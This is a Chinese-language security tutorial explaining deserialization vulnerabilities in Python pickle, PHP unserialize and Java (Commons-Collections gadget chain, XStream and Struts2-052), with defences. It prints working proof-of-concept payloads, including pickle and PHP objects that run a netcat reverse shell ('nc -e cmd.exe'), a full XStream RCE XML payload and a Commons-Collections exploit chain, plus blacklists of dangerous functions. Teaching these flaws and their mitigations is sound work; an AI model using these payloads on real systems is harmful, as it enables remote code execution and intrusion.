原创： 4ct10n  合天智汇

  

##

**grammar_cjkRuby: true**

反序列化存在于各个开发语言的web应用，PHP、Python、Java都无一例外，趁着假期闲着无聊总结一下

  
 **Python反序列化漏洞**

 **简介**  

Python的主流序列化方式有两种Pickle&Json这里介绍由于Pickle的错误使用造成的漏洞利用

  
成因  

Python
中的pickle模块是可以将各种对象序列化存储的，可支持的序列化对象有整型、浮点、元组、数组、函数、类等。这里之所以产生漏洞其原因是可以将自定义的类进行序列化和反序列化。反序列化后产生的对象会在结束时触发
`__reduce__`函数从而触发自己的恶意代码。看一下利用方法

##  

利用  

Python Pickle 序列化函数有三类分别如下：

  1. `import pickle`

  2. `import cPickle as pickle`

  3. `from pickle import Pickle`

  4. `from pickle import Unpickle`

最后一种只能存储到文件，不可以到内存

具体的利用方法呢有两种形式1. 利用 `__del__` 魔法函数 触发恶意代码2. 利用 `__reduce__`触发反序列化重构

### 情况1 析构函数触发

触发条件比较苛刻，在攻击对象中必须自己包含析构函数，如下代码Generate.py

  1. `import pickle`

  2. `class test(object):`

  3. ` def __init__(self):`

  4. ` self.a = "nc -e cmd.exe 127.0.0.1 81"`

  5. `with open('log','wb') as f:`

  6. ` pickle.dump(test(),f)`

Test.py

  1. `import pickle`

  2. `import os`

  3. `class test(object):`

  4. ` def __init__(self):`

  5. ` pass`

  6. ` def __del__(self):`

  7. ` os.system(self.a)`

  8. `with open('log','r') as f:`

  9. ` pickle.load(f)`

  
![图片.png](https://image.3001.net/images/20181025/1540436881_5bd133913de95.png!small)  

### 情况2 利用reduce魔法函数

利用reduce魔法函数重构序列化类，需要注意的是反序列化之后要使用的模块必须由反序列化函数提供，也就是说即使在Test.py中存在着该模块reduce函数中也不能引用，这一点比较关键。

Generate.py

  1. `import pickle`

  2. `class test(object):`

  3. ` def __reduce__(self):`

  4. ` return eval,("__import__('os').system('nc -e cmd 127.0.0.1 81')",)`

  5. `with open('log','wb') as f:`

  6. ` pickle.dump(test(),f)`

  1. `import pickle`

  2. `import subprocess`

  3. `class test(object):`

  4. ` def __reduce__(self):`

  5. ` return subprocess.call,("nc -e cmd.exe 127.0.0.1 81 ",)`

  6. `with open('log','wb') as f:`

  7. ` pickle.dump(test(),f)`

Test.py

  1. `import pickle`

  2. `with open('log', 'r') as f:`

  3. ` pickle.load(f)`

##  

  
防范  

那么有了这个攻击思想怎么去防范呢，其实方法很简单就是在反序列化之前查看，反序列化内容有没有关键字。这里介绍两种防范方法

### 1 @装饰器

  1. `import pickle`

  2. `from functools import wraps`

  3. `black_list = ['subprocess']`

  4. `def __HookPickle__(func):`

  5. ` @wraps(func)`

  6. ` def f(*args):`

  7. ` data = args[0].read()`

  8. ` for i in black_list:`

  9. ` if i in data:`

  10. ` exit()`

  11. ` args[0].seek(0)`

  12. ` return func(*args)`

  13. ` return f`

  14. `@__HookPickle__`

  15. `def load(f):`

  16. ` return pickle.load(f)`

  17. `with open('log', 'r') as f:`

  18. ` load(f)`

### 2 直接过滤

这里直接将反序列化调用的REDUCE参数 进行过滤从而达到防范的目的  
![图片.png](https://image.3001.net/images/20181025/1540436903_5bd133a76fc46.png!small)  

unpkler.dispatch[REDUCR] 其中REDUCE='R' 然而unpkler.dispatch['R'] = reload_reduce

  

![图片.png](https://image.3001.net/images/20181025/1540437213_5bd134dd2fdf7.png!small)  

`_hook_call` 其实封装的是reload_reduce函数......

  1. `from os import *`

  2. `from sys import *`

  3. `from pickle import *`

  4. `from io import open as Open`

  5. `from pickle import Unpickler as Unpkler`

  6. `from pickle import Pickler as Pkler`

  7. `black_type_list = [eval]`

  8. `class FilterException(Exception):`

  9. ` def __init__(self, value):`

  10. ` super(FilterException, self).__init__(`

  11. ` 'the callable object {value} is not allowed'.format(value=str(value)))`

  12. `def _hook_call(func):`

  13. ` def wrapper(*args, **kwargs):`

  14. ` print args[0].stack`

  15. ` if args[0].stack[-2] in black_type_list:`

  16. ` raise FilterException(args[0].stack[-2])`

  17. ` return func(*args, **kwargs)`

  18. ` return wrapper`

  19. `def LOAD(file):`

  20. ` unpkler = Unpkler(file)`

  21. ` unpkler.dispatch[REDUCE] = _hook_call(unpkler.dispatch[REDUCE])`

  22. ` return Unpkler(file).load()`

  23. `with Open("test","rb") as f:`

  24. ` LOAD(f)`

最后的最后你需要一个black_list ，这里提供一个

  1. `[eval, execfile, compile, system, open, file, popen, popen2, popen3, popen4, fdopen,`

  2. ` tmpfile, fchmod, fchown, pipe, chdir, fchdir, chroot, chmod, chown, link,`

  3. ` lchown, listdir, lstat, mkfifo, mknod, mkdir, makedirs, readlink, remove, removedirs,`

  4. ` rename, renames, rmdir, tempnam, tmpnam, unlink, walk, execl, execle, execlp, execv,`

  5. ` execve, execvp, execvpe, exit, fork, forkpty, kill, nice, spawnl, spawnle, spawnlp, spawnlpe,`

  6. ` spawnv, spawnve, spawnvp, spawnvpe, load, loads, subprocess, commands]`

#  

PHP反序列化漏洞

简介  

PHP反序列化漏洞虽然利用的条件比Python的反序列化苛刻的多，其原因在于没有向python
魔法函数reduce那样重构一个类，因此必须有成熟的条件后才能进行攻击，同时也限定了PHP的反序列化漏洞理解起来比较简单。目前在网上有许多关于PHP的反序列化漏洞解析，这里介绍一种新的利用方法。

  
成因  

和python
反序列化第一种成因是一样的，由于触发魔法函数造成恶意代码执行。在PHP中主要序列化函数是serialize()，unserialize()，在执行unserialize后会触发
析构函数或是wakeup函数。根本原因还是由于class的魔法函数

  * 构造函数__construct()：当对象创建(new)时会自动调用。但在unserialize()时是不会自动调用的。

  * 析构函数__destruct()：当对象被销毁时会自动调用。

  * __wakeup() ：如前所提，unserialize()时会自动调用。

##  

  
利用  

### 简单利用

  1. `<?php `

  2. `/**`

  3. `* `

  4. `*/`

  5. `class test`

  6. `{`

  7. ` function __destruct(){`

  8. ` echo `nc -e cmd.exe 127.0.0.1 81`;`

  9. ` }`

  10. `}`

  11. `$s = 'O:4:"test":0:{}';`

  12. `unserialize($s);`

  13. ` ?>`

  1. `<?php `

  2. `/**`

  3. `* `

  4. `*/`

  5. `class test`

  6. `{`

  7. ` function __wakeup(){`

  8. ` echo `nc -e cmd.exe 127.0.0.1 81`;`

  9. ` }`

  10. `}`

  11. `// $a = new test();`

  12. `$s = 'O:4:"test":0:{}';`

  13. `// echo $s;`

  14. `unserialize($s);`

  15. ` ?>`

  
![图片.png](https://image.3001.net/images/20181025/1540437295_5bd1352f47f3a.png!small)  

### 命名空间反序列化运用

  1. `<?php `

  2. `namespace controllers;`

  3. `class User `

  4. `{`

  5. ` function __destruct()`

  6. ` {`

  7. ` echo `nc -e cmd.exe 127.0.0.1 81`;`

  8. ` }`

  9. `}`

  10. `$a = 'O:16:"controllers\User":0:{}';`

  11. `unserialize($a);`

和上面的效果是一样的

防范  

严格使用魔法函数，检查用户的输入，永远不要相信用户的输入

#  

  
Java的反序列化漏洞

简介  

Java的反序列化漏洞影响非常严重，对于Java来说序列化是将一个对象转换成其他可存储的格式比如二进制字符串、XML、Json格式等。因此在Java的反序列化漏洞中主要有三种利用方式

  1. ObjectIntputStream 对二进制字符串进行反序列化

  2. xstream 对xml进行反序列化

  3. fastjson.JSON 对json数据进行反序列化

每一类型的触发方式不是很相同 可以将Java 反序列化漏洞归结如下

### 第一种

  1. JAVA Apache-CommonsCollections 序列化漏洞

### 第二种

  1. structs2-052 xstream

  2. Weblogic XMLdecoder

### 第三种

  1. Fastjson反序列化漏洞

##  

  
成因  

本文先针对1、2种情况进行漏洞分析第一种情况，ObjectIntputStream在反序列化对象时会调用readObject方法，如果readObject方法中有危险函数就可能造成命令执行第二种情况，xstream在进行xml格式解析时会重构对象从而使恶意代码执行

  
利用  

先分析两个demo ，接着用两个真实的cve介绍漏洞的成因

### 1\. Serializable

  1. `import java.io.*;`

  2. `public class test{`

  3. ` public static void main(String args[]) throws Exception{`

  4. ` MySerializable Unsafe = new MySerializable();`

  5. ` Unsafe.name = "Only Test";`

  6. ` FileOutputStream fos = new FileOutputStream("object");`

  7. ` ObjectOutputStream os = new ObjectOutputStream(fos);`

  8. ` //将对象序列化存入文件`

  9. ` os.writeObject(Unsafe);`

  10. ` os.close();`

  11. ` //从文件中读取序列化内容并反序列化`

  12. ` FileInputStream fis = new FileInputStream("object");`

  13. ` ObjectInputStream ois = new ObjectInputStream(fis);`

  14. ` //恢复对象`

  15. ` MySerializable objectFromDisk = (MySerializable)ois.readObject();`

  16. ` System.out.println(objectFromDisk.name);`

  17. ` ois.close();`

  18. ` }`

  19. `}`

  20. `class MySerializable implements Serializable{`

  21. ` public String name;`

  22. ` //重写readObject 反序列化方法`

  23. ` private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException{`

  24. ` //执行默认的readObject()方法`

  25. ` in.defaultReadObject();`

  26. ` //触发恶意代码`

  27. ` Runtime.getRuntime().exec("calc");`

  28. ` }`

  29. `}`

MySerializable 实现了Serializable接口将readObject
方法重写并且其中包含了弹出计算器的代码，在反序列化的时候会触发该函数并弹出计算器

### 2\. xstream

payload构造方法

  1. `git clone https://github.com/mbechler/marshalsec.git`

  2. `mvn clean package -DskipTests`

  3. `java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.XStream ImageIO calc`

![640.jpg](https://image.3001.net/images/20181025/1540437813_5bd137356850d.jpg!small)  
  

xstream的反序列化确实可以造成命令执行，如下代码

  1. `import java.io.IOException;`

  2. `import com.thoughtworks.xstream.XStream;`

  3. `import com.thoughtworks.xstream.io.xml.DomDriver;`

  4. `import java.beans.EventHandler;`

  5. `import java.util.Set;`

  6. `import java.util.TreeSet;`

  7. `public class Main {`

  8. ` public static void main(String[] args) throws IOException {`

  9. ` XStream xstream = new XStream();`

  10. ` String payload = "<map><entry><jdk.nashorn.internal.objects.NativeString> <flags>0</flags> <value class=\"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data\"> <dataHandler> <dataSource class=\"com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource\"> <is class=\"javax.crypto.CipherInputStream\"> <cipher class=\"javax.crypto.NullCipher\"> <initialized>false</initialized> <opmode>0</opmode> <serviceIterator class=\"javax.imageio.spi.FilterIterator\"> <iter class=\"javax.imageio.spi.FilterIterator\"> <iter class=\"java.util.Collections$EmptyIterator\"/> <next class=\"java.lang.ProcessBuilder\"> <command><string>calc</string> </command> <redirectErrorStream>false</redirectErrorStream> </next> </iter> <filter class=\"javax.imageio.ImageIO$ContainsFilter\"> <method> <class>java.lang.ProcessBuilder</class> <name>start</name> <parameter-types/> </method> <name>foo</name> </filter> <next class=\"string\">foo</next> </serviceIterator> <lock/> </cipher> <input class=\"java.lang.ProcessBuilder$NullInputStream\"/> <ibuffer></ibuffer> <done>false</done> <ostart>0</ostart> <ofinish>0</ofinish> <closed>false</closed> </is> <consumed>false</consumed> </dataSource> <transferFlavors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference=\"../jdk.nashorn.internal.objects.NativeString\"/> </entry> <entry> <jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/> <jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/></entry></map>";`

  11. ` xstream.fromXML(payload);`

  12. ` }`

  13. `}`

xstream从xml中解析出对象后执行恶意代码

两种类型的漏洞

### Structs2-052

漏洞存在于structs2-rest-plugin-2.5.12中

![641.png](https://image.3001.net/images/20181025/1540438119_5bd138670042f.png!small)  
  

从请求数据中获得request请求内容，以文件的方式尽心读取，将对象传递给handler.toObject的方法，此时的handler是XStreamHandler
其方法如下

  
![642.png](https://image.3001.net/images/20181025/1540438151_5bd13887dba9f.png!small)  

成功触发xstream的fromxml方法

有个这个分析payload的利用方式就简单了

从xml到命令执行还没有搞懂，有时间继续搞一搞

### Apache commons-collection.jar

趁着放假，把该漏洞从头到尾的复现了一遍，受影响的的web应用有JBoss等其根本原因是
`org.apache.commons.collections.functors.InvokerTransformer`存在反射执行函数，并且在
其中有触发java反射机制其中的transform函数起到关键作用

  
![643.png](https://image.3001.net/images/20181025/1540438246_5bd138e68c81e.png!small)![644.png](https://image.3001.net/images/20181025/1540438313_5bd13929cf6e5.png!small)![644.png](https://image.3001.net/images/20181025/1540438342_5bd13946c2b89.png!small)![644.png](https://image.3001.net/images/20181025/1540438384_5bd13970e6df0.png!small)![645.png](https://image.3001.net/images/20181025/1540438447_5bd139af7e3f6.png!small)  

可以实现执行input 对象中iMethodName方法并且以iArgs为参数那么怎么做到命令执行呢

  1. ` Transformer trans = new InvokerTransformer("append",new Class[]{String.class},new Object[]{"xxx"});`

  2. ` Object a = trans.transform(new StringBuffer("asd"));`

  3. ` System.out.print(a);`

可以看到主要是transform进行命令执行，如果想要执行系统命令需要什么指令

  1. `Runtime r = (Runtime)Class.forName("java.lang.Runtime").getMethod("getRuntime",newjava.lang.Class[]{}).invoke(null,newObject[]{}); `

有多层包含关系，那么可以利用java的ChainedTransformer进行命令执行

![图片.png](https://image.3001.net/images/20181025/1540438485_5bd139d5ee59f.png!small)  

  
  

可以看到执行链，一层套一层，第一层的object将带入第二层以此类推

那么可以构造以下payload

  1. `package test;`

  2. `import java.io.File;`

  3. `import java.io.FileOutputStream;`

  4. `import java.util.HashMap;`

  5. `import java.util.Map;`

  6. `import java.util.Map.Entry;`

  7. `import org.apache.commons.collections.Transformer;`

  8. `import org.apache.commons.collections.functors.ChainedTransformer;`

  9. `import org.apache.commons.collections.functors.ConstantTransformer;`

  10. `import org.apache.commons.collections.functors.InvokerTransformer;`

  11. `import org.apache.commons.collections.map.TransformedMap;`

  12. `public class orign {`

  13. ` public static void main(String[] args) {`

  14. ` Transformer[] transformers = new Transformer[]{`

  15. ` new ConstantTransformer(Runtime.class),`

  16. ` new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class},`

  17. ` new Object[]{"getRuntime", new Class[0]}),`

  18. ` new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class}, `

  19. ` new Object[]{null, new Object[0]}),`

  20. ` new InvokerTransformer("exec", new Class[]{String.class}, `

  21. ` new Object[]{"calc"})`

  22. ` };`

  23. ` Transformer chain = new ChainedTransformer(transformers) ;`

  24. ` chain.transform("xx");`

  25. ` }`

  26. `}`

目前找到了触发恶意代码的方式，那么回过头想一想反序列化与transform函数之间还需要什么东西去连接

![图片.png](https://image.3001.net/images/20181025/1540438496_5bd139e004e1a.png!small)  

接下来就是寻找一个类继承Serializbale接口 包含readObject方法并且该方法中包含触发transform函数的方式

巧妙的是在TransformedMap（是Map的子类）中正好有一个setValu可以触发transform方法此时关系图就变成了下图

  
![图片.png](https://image.3001.net/images/20181025/1540438501_5bd139e5a9aa2.png!small)  

此时如果有某个类的readObject方法含有Map 迭代的话 并且执行了setValue函数就完美了。

凑巧的是真有这样的类，在 sun.reflect.annotation.AnnotationInvocationHandler中

该类的源码地址

<http://www.docjar.com/html/api/sun/reflect/annotation/AnnotationInvocationHandler.java.html>该类继承了Serializable并冲写了readObject方法

![图片.png](https://image.3001.net/images/20181025/1540438509_5bd139ed7efcc.png!small)  

  
![图片.png](https://image.3001.net/images/20181025/1540438514_5bd139f29f214.png!small)  

最后在setValue函数处触发，至此构成了完整的利用链，见下图

  
![图片.png](https://image.3001.net/images/20181025/1540438520_5bd139f872e4b.png!small)  

为了方便演示将Person代替AnnotationInvocationHandler类进行处理

  1. `// Person.java`

  2. `package test;`

  3. `import java.io.IOException;`

  4. `import java.io.Serializable;`

  5. `import java.security.KeyStore.Entry;`

  6. `import java.util.Map;`

  7. `public class Person implements Serializable{`

  8. ` private String name;`

  9. ` public Map map;`

  10. ` private void readObject(java.io.ObjectInputStream in) throws ClassNotFoundException,IOException{`

  11. ` in.defaultReadObject();`

  12. ` if(map != null){`

  13. ` Map.Entry a = (Map.Entry) map.entrySet().iterator().next();`

  14. ` a.setValue("what?");`

  15. ` }`

  16. ` }`

  17. `}`

生成序列化文件

  1. `//Generate.java`

  2. `package test;`

  3. `import java.io.File;`

  4. `import java.io.FileOutputStream;`

  5. `import java.io.ObjectOutputStream; `

  6. `import java.util.Map;`

  7. `import java.util.HashMap; `

  8. `import java.lang.annotation.Target;`

  9. `import java.lang.reflect.Constructor; `

  10. `import org.apache.commons.collections.Transformer;`

  11. `import org.apache.commons.collections.map.TransformedMap;`

  12. `import org.apache.commons.collections.functors.InvokerTransformer;`

  13. `import org.apache.commons.collections.functors.ChainedTransformer;`

  14. `import org.apache.commons.collections.functors.ConstantTransformer; `

  15. `public class TransformTest { `

  16. ` public static Object getAnnotationInvocationHandler(String command) throws Exception {`

  17. ` String[] execArgs = command.split(",");`

  18. ` Transformer[] transformers = new Transformer[] {`

  19. ` new ConstantTransformer(Runtime.class),`

  20. ` new InvokerTransformer("getMethod", new Class[] {`

  21. ` String.class, Class[].class }, new Object[] {`

  22. ` "getRuntime", new Class[0] }),`

  23. ` new InvokerTransformer("invoke", new Class[] {`

  24. ` Object.class, Object[].class }, new Object[] {`

  25. ` null, new Object[0] }),`

  26. ` new InvokerTransformer("exec", new Class[] {`

  27. ` String.class }, new Object[] {"calc.exe"})};`

  28. ` Transformer transformerChain = new ChainedTransformer(transformers);`

  29. ` Map tempMap = new HashMap();`

  30. ` tempMap.put("value", "value");//这里不能少要不然setValue 会执行出错`

  31. ` Map exMap = TransformedMap.decorate(tempMap, null, transformerChain);`

  32. ` //setValue会触发transform方法`

  33. `// Map.Entry onlyElement = (Map.Entry) exMap.entrySet().iterator().next();`

  34. `// onlyElement.setValue("foobar");`

  35. ` Person p = new Person();`

  36. ` p.map = exMap;`

  37. ` return p;`

  38. ` } `

  39. ` public static void main(String[] args) throws Exception {`

  40. ` String command = (args.length != 0) ? args[0] : "calc.exe"; `

  41. ` Object obj = getAnnotationInvocationHandler(command);`

  42. ` File f = new File("bbb");`

  43. ` ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));`

  44. ` out.writeObject(obj);`

  45. ` }`

  46. `}`

反序列化触发漏洞

  1. `//unserialize.java`

  2. `package test;`

  3. `import java.io.FileInputStream;`

  4. `import java.io.ObjectInputStream;`

  5. `import java.lang.reflect.Method;`

  6. `public class unserialize {`

  7. ` public static void main(String[] args) throws Exception {`

  8. ` FileInputStream in;`

  9. ` try {`

  10. ` in = new FileInputStream("bbb");`

  11. ` ObjectInputStream ins = new ObjectInputStream(in);`

  12. ` ins.readObject();`

  13. ` } catch (Exception e) {`

  14. ` // TODO: handle exception`

  15. ` }`

  16. ` }`

  17. `}`

![图片.png](https://image.3001.net/images/20181025/1540438536_5bd13a08ea5aa.png!small)  

这就是整个的攻击流程总体来讲的话，反序话会触发对象readObject函数 ，恰巧在该函数中有能够触发反射链的Map.Entry
setValue函数，从而造成了恶意代码执行。

这里给出测试样例地址<https://github.com/actionyz/vulhub/tree/master/Serialize>

##  

  
防范  

对于xml的反序列化攻击可以添加对xstream反序列化的限制

  
![图片.png](https://image.3001.net/images/20181025/1540438554_5bd13a1a256f8.png!small)  

对于commons-collections 将 java.io.ObjectInputStream
反序列化操作替换成SerialKiller，这样就可以利用白名单黑名单进行过滤。

#  

参考资料

探秘Java反序列化漏洞一：序列化与反序列化 rui0.cn/archives/924Java 反序列化漏洞从无到有
<http://www.freebuf.com/column/155381.htmlJava>反序列化漏洞从入门到深入
<https://xz.aliyun.com/t/2041S2-052>从Payload到执行浅析
<http://www.freebuf.com/vuls/147170.htmlcommon-collections>中Java反序列化漏洞导致的RCE原理分析 <http://www.91ri.org/14522.htmlCommons>
Collections Java反序列化漏洞深入分析
<https://security.tencent.com/index.php/blog/msg/97>

（如需转载请注明出处）  

